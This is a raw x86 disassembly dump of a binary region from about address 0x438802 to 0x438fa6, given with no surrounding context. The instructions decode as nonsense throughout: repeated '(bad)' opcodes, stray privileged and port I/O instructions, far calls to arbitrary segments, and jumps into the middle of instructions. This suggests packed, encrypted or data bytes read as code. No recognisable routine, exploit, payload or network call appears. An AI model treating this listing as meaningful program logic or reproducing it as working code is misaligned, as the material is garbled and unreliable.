  438802:	mov    dl,0xb8
  438804:	fbstp  TBYTE PTR [esi+0x2]
  438807:	or     DWORD PTR [edi],esi
  438809:	add    DWORD PTR [ebx-0x788916ee],ebx
  43880f:	jo     0x4387e6
  438811:	jle    0x438811
  438813:	cs xor si,si
  438817:	or     BYTE PTR [edi-0x16ed65ff],dl
  43881d:	jbe    0x4387a6
  43881f:	jo     0x438816
  438821:	popa   
  438822:	retf   0x7107
  438825:	test   DWORD PTR [eax*4-0xafa9f],ecx
  43882c:	call   0x78574a76
  438831:	imul   ebp,DWORD PTR [eax],0x68218fc5
  438837:	bound  esi,QWORD PTR [eax+0x9]
  43883a:	fwait
  43883b:	adc    ch,cl
  43883d:	jbe    0x4387cc
  43883f:	push   esp
  438840:	shl    BYTE PTR [esi],cl
  438842:	xchg   DWORD PTR [ebx-0xf],ebx
  438845:	pop    ds
  438846:	jb     0x438804
  438848:	xlat   BYTE PTR ds:[ebx]
  438849:	jbe    0x43884d
  43884b:	out    0xdb,eax
  43884d:	sbb    ebx,DWORD PTR [ebx-0x7]
  438850:	xchg   DWORD PTR [ecx],eax
  438852:	pop    DWORD PTR [eax]
  438854:	in     eax,dx
  438855:	jbe    0x438859
  438857:	bound  edi,QWORD PTR [edx+0x7906e4d8]
  43885d:	push   ds
  43885e:	hlt    
  43885f:	(bad)  
  438860:	call   0x9cd3de
  438865:	add    BYTE PTR [eax],al
  438867:	add    BYTE PTR [eax],al
  438869:	add    BYTE PTR [edx+0x2abc87dd],dl
  43886f:	add    eax,0xe8d75b00
  438874:	push   esp
  438875:	ret    
  438876:	loopne 0x438898
  438878:	int3   
  438879:	int3   
  43887a:	add    BYTE PTR [ecx],ah
  43887c:	int3   
  43887d:	int3   
  43887e:	loopne 0x4388a0
  438880:	int3   
  438881:	int3   
  438882:	(bad)  
  438883:	push   edx
  438884:	mov    ecx,0xc015ffff
  438889:	lea    esp,[edx+0x1c000079]
  43888f:	loopne 0x4388d1
  438891:	add    BYTE PTR [edx+0x1a73f8c7],cl
  438897:	imul   edi,DWORD PTR [ecx+edi*1+0xc],0x58
  43889c:	aas    
  43889d:	inc    eax
  43889e:	pop    edi
  43889f:	les    eax,FWORD PTR [ebx]
  4388a1:	shl    DWORD PTR [esi],1
  4388a3:	xchg   al,bh
  4388a5:	pop    ds
  4388a6:	mov    dl,0xbe
  4388a8:	pop    ebp
  4388a9:	xor    edx,0xffffffac
  4388ac:	add    BYTE PTR [eax],al
  4388ae:	fadd   QWORD PTR [ebp*2-0x497a45cc]
  4388b5:	mov    esp,0x4cc
  4388ba:	fsin   
  4388bc:	pop    ebp
  4388bd:	adc    DWORD PTR [edx+0x1d],0x0
  4388c1:	add    BYTE PTR [esp+eax*1+0x2544206d],bl
  4388c8:	add    BYTE PTR [eax],al
  4388ca:	mov    edi,ds
  4388cc:	test   DWORD PTR [eax+eax*1],edx
  4388cf:	add    BYTE PTR [eax],al
  4388d1:	add    BYTE PTR [eax],al
  4388d3:	popf   
  4388d4:	add    al,0x0
  4388d6:	nop
  4388d7:	cli    
  4388d8:	test   DWORD PTR [ecx],esi
  4388da:	add    BYTE PTR [ecx],cl
  4388dc:	add    eax,DWORD PTR [eax-0x7d]
  4388df:	int    0x9
  4388e1:	xor    eax,0x45d00
  4388e6:	jl     0x43895d
  4388e8:	dec    eax
  4388e9:	sub    eax,0x37236c0
  4388ee:	add    BYTE PTR [ebp+0x69],dh
  4388f1:	ds int3 
  4388f3:	inc    ecx
  4388f4:	scas   al,BYTE PTR es:[edi]
  4388f5:	inc    eax
  4388f6:	int3   
  4388f7:	cmp    DWORD PTR [ebp+0x3d],ebx
  4388fa:	push   edx
  4388fb:	out    dx,al
  4388fc:	call   0x4643:0x5474e27d
  438903:	inc    esp
  438904:	jae    0x438903
  438906:	mov    edi,0xefe99bf0
  43890b:	inc    esp
  43890c:	or     dl,0xbc
  43890f:	sub    DWORD PTR [esi-0x51be33c0],edx
  438915:	inc    eax
  438916:	int3   
  438917:	cmp    ebp,esp
  438919:	jnp    0x4388d7
  43891b:	imul   ebp,DWORD PTR [ecx-0x3],0x4c
  43891f:	mul    dl
  438921:	adc    esi,DWORD PTR [ebx-0x56]
  438924:	jo     0x4388d9
  438926:	cwde   
  438927:	sub    eax,0xeefffd60
  43892c:	cdq    
  43892d:	adc    DWORD PTR [ebp+0x1c75512d],eax
  438933:	fs and ah,al
  438936:	adc    eax,DWORD PTR [eax]
  438938:	add    BYTE PTR [eax],al
  43893a:	add    BYTE PTR [eax],al
  43893c:	jp     0x43891d
  43893e:	mov    esi,DWORD PTR [edi-0x7b029695]
  438944:	sub    eax,0x7d50765d
  438949:	ror    DWORD PTR [edi],1
  43894b:	rsm    
  43894d:	test   eax,0x87ac2d11
  438952:	jl     0x4388dc
  438954:	fnstsw WORD PTR [edi]
  438956:	std    
  438957:	(bad)  
  438958:	cld    
  438959:	shr    DWORD PTR [edi-0x39968aee],1
  43895f:	mov    esp,0x7bf552f6
  438964:	push   edx
  438965:	add    ch,BYTE PTR [esi-0x2d]
  438968:	jp     0x4388f5
  43896a:	das    
  43896b:	sbb    bl,dh
  43896d:	jns    0x4388fe
  43896f:	adc    eax,0xf5f0275
  438974:	jae    0x438985
  438976:	jns    0x43890b
  438978:	or     bh,al
  43897a:	out    0x3,al
  43897c:	dec    esp
  43897d:	ret    0x82da
  438980:	cmc    
  438981:	popf   
  438982:	rol    DWORD PTR [ebx],1
  438984:	jne    0x4389e0
  438986:	or     DWORD PTR [ebp+0x5],edi
  438989:	call   0x3fa5:0xbb7503f1
  438990:	xor    DWORD PTR [esi-0x65],ecx
  438993:	aas    
  438994:	sub    DWORD PTR [esi-0x4d],ecx
  438997:	aas    
  438998:	inc    ecx
  438999:	dec    esi
  43899a:	stos   DWORD PTR es:[edi],eax
  43899b:	aas    
  43899c:	cmp    DWORD PTR [esi+0x5e],ecx
  43899f:	jnp    0x4389a1
  4389a1:	add    BYTE PTR [eax],al
  4389a3:	add    BYTE PTR [eax],al
  4389a5:	shl    edi,0xe6
  4389a8:	add    ebp,DWORD PTR [eax+0x6cfb6083]
  4389ae:	and    al,0xea
  4389b0:	mov    ch,0xd
  4389b2:	call   0x17b7:0x8b7503f9
  4389b9:	lock leave 
  4389bb:	out    dx,al
  4389bc:	jnp    0x438a2f
  4389be:	icebp  
  4389bf:	cmp    ebx,eax
  4389c1:	mov    bx,WORD PTR [edi-0x214e07e9]
  4389c8:	inc    BYTE PTR [edx+edi*2]
  4389cb:	pusha  
  4389cc:	adc    eax,0x130e0275
  4389d1:	test   BYTE PTR [eax-0x6f],0x11
  4389d5:	clc    
  4389d6:	leave  
  4389d7:	fidivr WORD PTR [edx+0x45]
  4389da:	imul   BYTE PTR [ebx+ecx*4-0x33]
  4389de:	mul    esi
  4389e0:	add    edi,ebp
  4389e2:	std    
  4389e3:	call   edi
  4389e5:	adc    eax,edx
  4389e7:	adc    edi,DWORD PTR [edx+0x7186e439]
  4389ed:	and    ecx,esi
  4389ef:	(bad)  
  4389f0:	call   0x14e4
  4389f5:	jbe    0x4389f9
  4389f7:	push   ebp
  4389f8:	stos   BYTE PTR es:[edi],al
  4389f9:	mov    ch,0x4e
  4389fb:	int3   
  4389fc:	mov    ch,0xb5
  4389fe:	dec    esi
  4389ff:	int3   
  438a00:	lods   eax,DWORD PTR ds:[esi]
  438a01:	mov    ch,0x4e
  438a03:	int3   
  438a04:	sbb    al,0xbc
  438a06:	outs   dx,BYTE PTR ds:[esi]
  438a07:	dec    ebp
  438a08:	pop    ss
  438a09:	add    BYTE PTR [eax],al
  438a0b:	add    BYTE PTR [eax],al
  438a0d:	add    BYTE PTR [ebp+esi*1-0x732e647b],bh
  438a14:	stc    
  438a15:	sahf   
  438a16:	cwde   
  438a17:	fistp  QWORD PTR [edx-0x1f]
  438a1a:	jbe    0x4389f2
  438a1c:	cmp    eax,0x84f1d962
  438a21:	sbb    DWORD PTR [ecx],edx
  438a23:	xchg   BYTE PTR [eax+ebx*8],bl
  438a26:	cdq    
  438a27:	ret    0x6213
  438a2a:	sub    DWORD PTR [esi],eax
  438a2c:	push   ecx
  438a2d:	bound  ecx,QWORD PTR [ecx]
  438a2f:	repnz test BYTE PTR [edx],dh
  438a32:	ss or  BYTE PTR gs:[ecx+0x75],dh
  438a37:	repz clc 
  438a39:	test   eax,0xf578878a
  438a3e:	pop    ebp
  438a3f:	mov    dl,0x7
  438a41:	jae    0x4389cf
  438a43:	push   eax
  438a44:	iret   
  438a45:	jno    0x438abc
  438a47:	repz clc 
  438a49:	test   eax,0xd578876a
  438a4e:	cmp    eax,0x6c7207b2
  438a53:	push   ebx
  438a54:	iret   
  438a55:	sub    BYTE PTR [esi+0xa],cl
  438a58:	mov    ch,ah
  438a5a:	mov    DWORD PTR [ebx+0x40],ebx
  438a5d:	cmc    
  438a5e:	test   eax,0x1000d580
  438a63:	and    DWORD PTR [ebp+0x19c9b],eax
  438a69:	add    BYTE PTR [edi],dl
  438a6b:	sahf   
  438a6c:	or     eax,0x4459dc8b
  438a71:	mov    DWORD PTR [eax],eax
  438a73:	add    BYTE PTR [eax],al
  438a75:	add    BYTE PTR [eax],al
  438a77:	mov    ecx,0xe41e835e
  438a7c:	or     eax,0x5ea98b09
  438a81:	clc    
  438a82:	inc    eax
  438a83:	pusha  
  438a84:	inc    edi
  438a85:	jle    0x438a62
  438a87:	xchg   ecx,eax
  438a88:	in     al,0x55
  438a8a:	pop    ebx
  438a8b:	imul   eax,ebx,0xdb61cccb
  438a91:	jmp    0x438a16
  438a93:	clc    
  438a94:	and    BYTE PTR [esi-0x73],cl
  438a97:	xchg   ecx,eax
  438a98:	loopne 0x438ac4
  438a9a:	leave  
  438a9b:	xchg   esp,eax
  438a9c:	add    BYTE PTR [eax],al
  438a9e:	add    BYTE PTR [edx+edi*8],cl
  438aa1:	int    0x8d
  438aa3:	inc    eax
  438aa4:	inc    ebx
  438aa5:	pop    edi
  438aa6:	mov    edx,DWORD PTR [eax]
  438aa8:	adc    al,0xe0
  438aaa:	popw   ds
  438aac:	rcr    BYTE PTR [ebp+0x3],1
  438aaf:	sbb    BYTE PTR [esi-0x50],0xce
  438ab3:	jb     0x438a8e
  438ab5:	dec    ebx
  438ab6:	inc    ebp
  438ab7:	cmp    al,0x41
  438ab9:	jl     0x438ab3
  438abb:	fld    TBYTE PTR [esi-0x23]
  438abe:	xor    eax,DWORD PTR [edx-0x7c]
  438ac1:	sar    DWORD PTR [eax+0x70],cl
  438ac4:	pop    edi
  438ac5:	mov    al,0x54
  438ac7:	push   ebx
  438ac8:	add    edi,DWORD PTR [ebp-0x2e]
  438acb:	add    bh,dh
  438acd:	push   es
  438ace:	mov    bh,0x10
  438ad0:	xor    al,0xd9
  438ad2:	mov    edx,DWORD PTR [ecx+eax*2+0x33e0895f]
  438ad9:	fld1   
  438adb:	add    BYTE PTR [eax],al
  438add:	add    BYTE PTR [eax],al
  438adf:	add    ah,cl
  438ae1:	out    dx,al
  438ae2:	idiv   bh
  438ae4:	jne    0x438a73
  438ae6:	jbe    0x438aec
  438ae8:	loop   0x438a8e
  438aea:	sub    ch,ch
  438aec:	adc    esp,DWORD PTR [edi]
  438aee:	retf   
  438aef:	test   BYTE PTR [eax-0x4e33bf83],dl
  438af5:	jge    0x438b6f
  438af7:	in     al,dx
  438af8:	neg    BYTE PTR [esi-0xa]
  438afb:	test   BYTE PTR [eax-0x1af2daf],bh
  438b01:	and    DWORD PTR [ecx+0x40],edi
  438b04:	ins    DWORD PTR es:[edi],dx
  438b05:	loopne 0x438ada
  438b07:	or     ebp,esi
  438b09:	push   ecx
  438b0a:	add    bh,0x52
  438b0d:	pop    ecx
  438b0e:	cmp    eax,0x7b41a087
  438b13:	dec    ebx
  438b14:	inc    ecx
  438b15:	lods   eax,DWORD PTR ds:[esi]
  438b16:	jle    0x438b68
  438b18:	popa   
  438b19:	imul   edi,ebp,0xfd6975ff
  438b1f:	shl    bl,0x15
  438b22:	adc    BYTE PTR [eax],al
  438b24:	jne    0x438b5c
  438b26:	add    eax,DWORD PTR [eax]
  438b28:	jne    0x438b10
  438b2a:	push   ecx
  438b2b:	jp     0x438b78
  438b2d:	or     eax,DWORD PTR [ecx-0x16960dc4]
  438b33:	sbb    eax,0x13d3ec02
  438b38:	jne    0x438ba3
  438b3a:	jp     0x438ace
  438b3c:	inc    ebp
  438b3d:	pop    ebp
  438b3e:	std    
  438b3f:	(bad)  
  438b40:	cld    
  438b41:	in     eax,0x8d
  438b43:	pop    esp
  438b44:	add    BYTE PTR [eax],al
  438b46:	add    BYTE PTR [eax],al
  438b48:	add    BYTE PTR [esi+0x69],ch
  438b4b:	std    
  438b4c:	xchg   BYTE PTR [eax],dh
  438b4e:	int    0x3d
  438b50:	test   BYTE PTR [ebp+0x750009a1],al
  438b56:	imul   edi,DWORD PTR [edx-0x38],0xce326cce
  438b5d:	push   ebx
  438b5e:	loop   0x438b2f
  438b60:	xor    BYTE PTR [edi+0x2],0xa7
  438b64:	cs ss pop edx
  438b67:	fwait
  438b68:	cmp    eax,0xfb79c20
  438b6d:	jne    0x438b71
  438b6f:	in     eax,0xe8
  438b71:	inc    ebx
  438b72:	jg     0x438b74
  438b74:	push   es
  438b75:	push   cs
  438b76:	add    eax,0x67c27ea8
  438b7b:	in     eax,0x36
  438b7d:	mov    ch,0x5b
  438b7f:	popa   
  438b80:	aam    0x86
  438b82:	add    ah,bh
  438b84:	jle    0x438b8d
  438b86:	mov    dl,0xf2
  438b88:	add    esi,DWORD PTR [ebp-0x77]
  438b8b:	imul   edx,DWORD PTR [ecx+0x3e707b9],0xb
  438b92:	add    edi,esp
  438b94:	add    esi,DWORD PTR [ebp-0x1c]
  438b97:	outs   dx,DWORD PTR ds:[esi]
  438b98:	pmuludq mm0,QWORD PTR [ebx+0x6b]
  438b9c:	add    DWORD PTR [ebp+0x7503e6f6],ebx
  438ba2:	pop    ebx
  438ba3:	jno    0x438b40
  438ba5:	xchg   DWORD PTR [edx],eax
  438ba7:	out    0x80,eax
  438ba9:	dec    eax
  438baa:	(bad)  
  438bab:	(bad)  
  438bad:	add    BYTE PTR [eax],al
  438baf:	add    BYTE PTR [eax],al
  438bb1:	add    ch,ah
  438bb3:	lds    esp,FWORD PTR [ebp+0x5]
  438bb6:	pop    edx
  438bb7:	test   BYTE PTR [ebx+0x11],dl
  438bba:	jne    0x438bbe
  438bbc:	test   ax,0xf6a5
  438bc0:	out    0x3,al
  438bc2:	sti    
  438bc3:	(bad)  
  438bc4:	xor    al,0x7c
  438bc6:	ds pop esi
  438bc8:	outs   dx,BYTE PTR ds:[esi]
  438bc9:	shl    BYTE PTR [edx-0x77],1
  438bcc:	lods   eax,DWORD PTR ds:[esi]
  438bcd:	(bad)  
  438bce:	stc    
  438bcf:	xor    DWORD PTR [edi+0x7002750f],0x1e
  438bd6:	adc    eax,DWORD PTR [edi+0x7ec0541f]
  438bdc:	ds add al,0x41
  438bdf:	icebp  
  438be0:	call   FWORD PTR [ecx-0x6e17bfc5]
  438be6:	dec    ebp
  438be7:	pop    ecx
  438be8:	stc    
  438be9:	mov    dl,0xf3
  438beb:	inc    ebp
  438bec:	add    al,0x6a
  438bee:	adc    ebx,DWORD PTR [ebx+0x7c]
  438bf1:	push   es
  438bf2:	sbb    edi,DWORD PTR [edi+0x52b560f7]
  438bf8:	in     eax,0xee
  438bfa:	or     eax,0x76e924a6
  438bff:	add    al,BYTE PTR [eax]
  438c01:	(bad)  
  438c02:	hlt    
  438c03:	mov    cl,0x13
  438c05:	jmp    0x6fd00b80
  438c0a:	cmp    eax,0xe1e8ffff
  438c0f:	jl     0x438c71
  438c11:	loop   0x438c89
  438c13:	add    cl,BYTE PTR [eax+0x60]
  438c16:	add    BYTE PTR [eax],al
  438c18:	add    BYTE PTR [eax],al
  438c1a:	add    bh,dh
  438c1c:	mov    dl,0x13
  438c1e:	jmp    0x72426c99
  438c23:	mov    bh,0x81
  438c25:	mov    cl,BYTE PTR [ecx+0x38]
  438c28:	pop    edx
  438c29:	stc    
  438c2a:	rol    DWORD PTR [ebp+ebp*2-0x7b575907],0x60
  438c32:	bnd jbe 0x438c37
  438c35:	jge    0x438bda
  438c37:	mov    WORD PTR [ecx-0x6d],ds
  438c3a:	xor    eax,0x72000265
  438c3f:	(bad)  
  438c40:	scas   al,BYTE PTR es:[edi]
  438c41:	adc    ebp,ecx
  438c43:	jbe    0x438bc6
  438c45:	pushf  
  438c46:	addr16 sub eax,0x77e8ffff
  438c4c:	je     0x438ca2
  438c4e:	std    
  438c4f:	jbe    0x438c53
  438c51:	test   DWORD PTR [edi-0x3b],ebp
  438c54:	cmc    
  438c55:	(bad)  
  438c56:	call   0xadce0aba
  438c5b:	rcr    DWORD PTR [ecx-0x7],1
  438c5e:	add    BYTE PTR [edx-0x4578ec2a],bh
  438c64:	(bad)  
  438c65:	adc    ebx,DWORD PTR [edi+0x66f19157]
  438c6b:	adc    eax,0x288a86f2
  438c70:	or     al,0x58
  438c72:	adc    al,0x8c
  438c74:	add    eax,0x4d8a8c82
  438c79:	or     eax,0xc47e9c00
  438c7e:	add    al,0x0
  438c80:	add    BYTE PTR [eax],al
  438c82:	add    BYTE PTR [eax],al
  438c84:	mov    dh,0xb4
  438c86:	push   es
  438c87:	mov    dh,0x5e
  438c89:	dec    edi
  438c8a:	cld    
  438c8b:	push   cs
  438c8c:	cmp    dh,BYTE PTR [ebp-0x149bb27e]
  438c92:	mov    ecx,0x515be888
  438c97:	adc    al,0x4c
  438c99:	add    eax,0x631db707
  438c9e:	adc    BYTE PTR [ebx+ebx*8-0x1],0x5d
  438ca3:	mov    DWORD PTR [eax-0x75],ebp
  438ca6:	cli    
  438ca7:	mov    dl,dl
  438ca9:	gs add al,0x0
  438cac:	dec    esp
  438cad:	inc    esp
  438cae:	arpl   WORD PTR [ecx],ax
  438cb0:	xchg   edi,eax
  438cb1:	ret    
  438cb2:	or     BYTE PTR [ebp-0x2c],0xbc
  438cb6:	mov    esp,ebp
  438cb8:	add    ebp,edx
  438cba:	jp     0x438c80
  438cbc:	or     BYTE PTR [esi-0x4a],bh
  438cbf:	push   eax
  438cc0:	or     BYTE PTR ds:0xd0030200,al
  438cc6:	cmp    edi,edi
  438cc8:	sub    edx,0xfffffff6
  438ccb:	mov    ds,WORD PTR [eax-0xe]
  438cce:	(bad)  
  438ccf:	call   DWORD PTR [edi-0x7d]
  438cd2:	push   esp
  438cd3:	adc    al,0xdc
  438cd5:	add    al,0x83
  438cd7:	xchg   esi,eax
  438cd8:	lods   al,BYTE PTR ds:[esi]
  438cd9:	push   ebp
  438cda:	stc    
  438cdb:	push   DWORD PTR [ebp-0x1c]
  438cde:	mov    cl,0x7
  438ce0:	cld    
  438ce1:	into   
  438ce2:	jle    0x438d40
  438ce4:	jle    0x438d51
  438ce6:	std    
  438ce7:	test   BYTE PTR [eax],al
  438ce9:	add    BYTE PTR [eax],al
  438ceb:	add    BYTE PTR [eax],al
  438ced:	mov    ebx,0xbaeb27b2
  438cf2:	(bad)  
  438cf4:	pop    ebx
  438cf5:	mov    cl,0xb5
  438cf7:	mov    ?,WORD PTR [esi+edi*2]
  438cfa:	imul   edi,ebp,0xffffffe7
  438cfd:	in     al,0xf5
  438cff:	addr16 stc 
  438d01:	cmp    dl,BYTE PTR [esp+edi*2+0x312c30e3]
  438d08:	int3   
  438d09:	mov    ecx,0xb1cc310e
  438d0e:	es xor esp,ecx
  438d11:	test   eax,0xfef07c78
  438d16:	fild   WORD PTR [eax]
  438d18:	add    eax,0x8a786975
  438d1d:	or     DWORD PTR [edx-0x3],ebp
  438d20:	inc    ebx
  438d22:	inc    ecx
  438d23:	cmc    
  438d24:	call   0x82b8d67b
  438d29:	popf   
  438d2a:	push   esp
  438d2b:	std    
  438d2c:	push   eax
  438d2e:	out    0x7b,eax
  438d30:	pop    es
  438d31:	jne    0x438d9c
  438d33:	retf   
  438d34:	out    0x2c,eax
  438d36:	cwde   
  438d37:	popa   
  438d38:	stc    
  438d39:	clc    
  438d3a:	out    0x33,eax
  438d3c:	add    eax,0xe7cd6975
  438d41:	sub    BYTE PTR [edi+0x61],ch
  438d44:	stc    
  438d45:	neg    BYTE PTR [ebp+0x6967b7f8]
  438d4b:	std    
  438d4c:	dec    DWORD PTR [esi]
  438d4e:	ins    DWORD PTR es:[edi],dx
  438d4f:	js     0x438d98
  438d51:	add    BYTE PTR [eax],al
  438d53:	add    BYTE PTR [eax],al
  438d55:	add    BYTE PTR [ebp+0x60],dh
  438d58:	stos   DWORD PTR es:[edi],eax
  438d59:	mov    BYTE PTR [ecx+0x50ffc42c],dl
  438d5f:	add    ah,BYTE PTR [esi-0x58]
  438d62:	out    dx,eax
  438d63:	fsubr  st,st(4)
  438d65:	add    esi,DWORD PTR [ebp+0x2]
  438d68:	(bad)  
  438d6a:	jge    0x438cfc
  438d6c:	ja     0x438d79
  438d6e:	mov    dl,al
  438d70:	out    0xdd,al
  438d72:	inc    ecx
  438d73:	xchg   esi,eax
  438d74:	push   ecx
  438d75:	out    0x70,al
  438d77:	add    ah,bh
  438d79:	add    esp,DWORD PTR [esi]
  438d7b:	sbb    bl,dl
  438d7d:	lods   eax,DWORD PTR ds:[esi]
  438d7e:	std    
  438d7f:	cld    
  438d80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438d81:	ret    
  438d82:	mov    ds:0xefa865dd,al
  438d87:	fcomp  st(4)
  438d89:	add    esi,DWORD PTR [ebp+0x2]
  438d8c:	xchg   esp,eax
  438d8d:	xor    bh,BYTE PTR [eax+edx*4+0x57]
  438d91:	or     eax,0xdde6c240
  438d96:	stc    
  438d97:	xchg   ebp,eax
  438d98:	pop    ecx
  438d99:	out    0x78,al
  438d9b:	add    ah,bh
  438d9d:	add    esp,esi
  438d9f:	adc    ah,BYTE PTR [esi+0x5b]
  438da2:	jns    0x438d27
  438da4:	fild   WORD PTR [edx]
  438da6:	ficom  WORD PTR [edx-0xe6d489c]
  438dac:	out    0x75,eax
  438dae:	sbb    eax,0x9f03e6f0
  438db3:	inc    ebx
  438db4:	das    
  438db5:	jns    0x438d60
  438db7:	ret    0x4d7
  438dba:	add    BYTE PTR [eax],al
  438dbc:	add    BYTE PTR [eax],al
  438dbe:	add    bh,bh
  438dc0:	test   eax,0xb87503d1
  438dc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438dc6:	or     BYTE PTR ds:0x5ab76c04,0xf1
  438dcd:	out    0x75,eax
  438dcf:	fucomp st(7)
  438dd1:	out    0x3,al
  438dd3:	scas   eax,DWORD PTR es:[edi]
  438dd4:	inc    ebx
  438dd5:	pop    bx
  438dd7:	add    BYTE PTR [esi+0x16bc42b],al
  438ddd:	add    BYTE PTR [edi+0xe],ah
  438de0:	hlt    
  438de1:	(bad)  
  438de2:	call   0x36102397
  438de7:	stos   BYTE PTR es:[edi],al
  438de8:	inc    esi
  438de9:	int3   
  438dea:	sub    eax,0xbccc46a2
  438def:	dec    edi
  438df0:	test   WORD PTR [esi+ecx*8+0x7085887d],sp
  438df8:	add    al,BYTE PTR [eax]
  438dfa:	push   0x49
  438dfc:	or     edi,DWORD PTR [edx-0x40]
  438dff:	(bad)  
  438e00:	mov    al,0x84
  438e02:	mov    ah,0x7a
  438e04:	in     al,0x84
  438e06:	aas    
  438e07:	rol    BYTE PTR [ebp-0x22],0x72
  438e0b:	fdivp  st(6),st
  438e0d:	popa   
  438e0e:	loopne 0x438df6
  438e10:	cdq    
  438e11:	adc    ch,cl
  438e13:	jbe    0x438e1e
  438e15:	mov    dl,0x61
  438e17:	into   
  438e18:	repz (bad) 
  438e1a:	call   0x6157401e
  438e1f:	jp     0x438e26
  438e21:	or     DWORD PTR [edi],esi
  438e23:	add    BYTE PTR [eax],al
  438e25:	add    BYTE PTR [eax],al
  438e27:	add    dh,bh
  438e29:	lea    edx,[edx]
  438e2b:	jmp    0xf583e9a6
  438e30:	(bad)  
  438e32:	adc    esp,DWORD PTR [edx+0x29]
  438e35:	inc    BYTE PTR [edi-0x6f809813]
  438e3b:	test   DWORD PTR [ebx+0x2],esi
  438e3e:	add    BYTE PTR [esi-0x26510dcf],bh
  438e44:	mov    WORD PTR [edx+eiz*2],?
  438e47:	call   0x94f5:0xf94b7fc3
  438e4e:	in     eax,dx
  438e4f:	jo     0x438e52
  438e51:	xchg   edi,eax
  438e52:	adc    ch,cl
  438e54:	jbe    0x438ed5
  438e56:	push   ebx
  438e57:	(bad)  [eax]
  438e59:	jge    0x438e0b
  438e5b:	add    BYTE PTR [esp+eax*1+0x4b5a0000],dh
  438e62:	arpl   WORD PTR [ecx],ax
  438e64:	hlt    
  438e65:	retf   
  438e66:	repnz call FWORD PTR [ebx-0x7d]
  438e6a:	les    eax,FWORD PTR [ecx+edi*4]
  438e6d:	ret    0x8b5d
  438e70:	and    DWORD PTR [esi],eax
  438e72:	pop    esi
  438e73:	sar    DWORD PTR [esi],cl
  438e75:	cmp    DWORD PTR [ecx-0x4429aafd],0x16
  438e7c:	int3   
  438e7d:	add    DWORD PTR [ebx+0x2379c4d],eax
  438e83:	nop
  438e84:	and    al,0x4
  438e86:	add    BYTE PTR [eax],al
  438e88:	pop    ss
  438e89:	inc    ebp
  438e8a:	add    eax,0x6a
  438e8f:	add    BYTE PTR [eax],al
  438e91:	lea    edi,[ecx-0x20840457]
  438e97:	jp     0x438e5d
  438e99:	mov    al,ds:0x68ccbc3c
  438e9e:	sbb    cl,ah
  438ea0:	int3   
  438ea1:	dec    eax
  438ea2:	sbb    cl,ah
  438ea4:	int3   
  438ea5:	dec    eax
  438ea6:	sbb    cl,ah
  438ea8:	int3   
  438ea9:	adc    edx,ebx
  438eab:	jmp    0x438e38
  438ead:	adc    DWORD PTR [ecx+0x56],ebx
  438eb0:	jmp    0x3a79b5
  438eb5:	or     BYTE PTR ds:0xdb91cccc,cl
  438ebb:	jmp    0x438f0e
  438ebd:	(bad)  
  438ebe:	fist   DWORD PTR [eax+edx*1+0x62]
  438ec2:	fld    TBYTE PTR [eax+ecx*1-0x31]
  438ec6:	lahf   
  438ec7:	test   BYTE PTR [eax],al
  438ec9:	sbb    al,0x1
  438ecb:	add    BYTE PTR [edi-0x2d],dl
  438ece:	xchg   ebx,eax
  438ecf:	cmc    
  438ed0:	add    BYTE PTR [ecx+eax*1],cl
  438ed3:	add    BYTE PTR [esi+0x5f],bh
  438ed6:	(bad)  ds:0x17ec7583
  438edc:	inc    BYTE PTR [ecx-0x30daa9d]
  438ee2:	jnp    0x438f48
  438ee4:	xchg   DWORD PTR [edx-0x727d8db9],esi
  438eea:	pusha  
  438eeb:	std    
  438eec:	inc    DWORD PTR [ebp-0x7d]
  438eef:	sub    al,0xfc
  438ef1:	loop   0x438ece
  438ef3:	jno    0x438e7f
  438ef5:	add    BYTE PTR [eax],al
  438ef7:	add    BYTE PTR [eax],al
  438ef9:	add    BYTE PTR [ecx+0x24fffd50],dl
  438eff:	ret    
  438f00:	pop    ss
  438f01:	cld    
  438f02:	retf   0x7fc3
  438f05:	les    ebp,FWORD PTR [ebp-0x30]
  438f08:	cmp    ch,al
  438f0a:	xchg   esp,eax
  438f0b:	adc    eax,0xb4fef964
  438f10:	xchg   esp,eax
  438f11:	adc    dh,BYTE PTR [ebp+0x6b]
  438f14:	js     0x438ea0
  438f16:	rcl    DWORD PTR [ebp+edi*8-0x1],1
  438f1a:	imul   BYTE PTR [eax]
  438f1c:	idiv   DWORD PTR [esp+esi*4+0x60]
  438f20:	ds out 0x76,al
  438f23:	sub    dl,BYTE PTR [esi-0x3]
  438f26:	in     eax,dx
  438f27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438f28:	popa   
  438f29:	xor    eax,0xe4fbcbaf
  438f2e:	jbe    0x438f0e
  438f30:	mov    bh,0x2
  438f32:	(bad)  
  438f33:	cli    
  438f34:	jno    0x438f73
  438f36:	jns    0x438f58
  438f38:	inc    edx
  438f39:	jno    0x438fb9
  438f3b:	rol    dh,1
  438f3d:	or     edi,eax
  438f3f:	test   eax,0xc6fe13d8
  438f44:	not    DWORD PTR [eax-0x5a]
  438f47:	stc    
  438f48:	mov    ch,0xe7
  438f4a:	add    al,0x94
  438f4c:	pop    ebp
  438f4d:	stc    
  438f4e:	mul    BYTE PTR [ebp+0x6ab9e6f4]
  438f54:	std    
  438f55:	push   esi
  438f57:	add    ah,BYTE PTR [ecx-0x74]
  438f5a:	jne    0x438f5e
  438f5c:	out    0x7,eax
  438f5e:	add    BYTE PTR [eax],al
  438f60:	add    BYTE PTR [eax],al
  438f62:	add    BYTE PTR [esi+edi*2+0x5c],bh
  438f66:	add    al,0x75
  438f68:	add    cl,dh
  438f6a:	dec    ebp
  438f6b:	ins    BYTE PTR es:[edi],dx
  438f6c:	jle    0x438fc2
  438f6e:	add    al,0x75
  438f70:	add    ch,BYTE PTR [esi-0x6e]
  438f73:	xor    ebp,ebp
  438f75:	out    0x3,al
  438f77:	lock aad 0xd2
  438f7a:	nop
  438f7b:	inc    esp
  438f7c:	(bad)  
  438f7d:	gs pop ebp
  438f7f:	outs   dx,BYTE PTR ds:[esi]
  438f80:	aam    0xb4
  438f82:	jmp    0x370cd080
  438f87:	aad    0x87
  438f89:	cdq    
  438f8a:	not    DWORD PTR [ecx+ecx*1+0x69]
  438f8e:	pushf  
  438f8f:	addr16 add ah,bh
  438f92:	adc    ah,bh
  438f94:	je     0x439005
  438f96:	cli    
  438f97:	stos   BYTE PTR es:[edi],al
  438f98:	push   ebx
  438f99:	pop    esi
  438f9a:	retf   0x8a7a
  438f9d:	add    eax,DWORD PTR ds:0x12f2bc9c
  438fa3:	(bad)  
  438fa4:	je     0x438ff6
  438fa6:	cli    
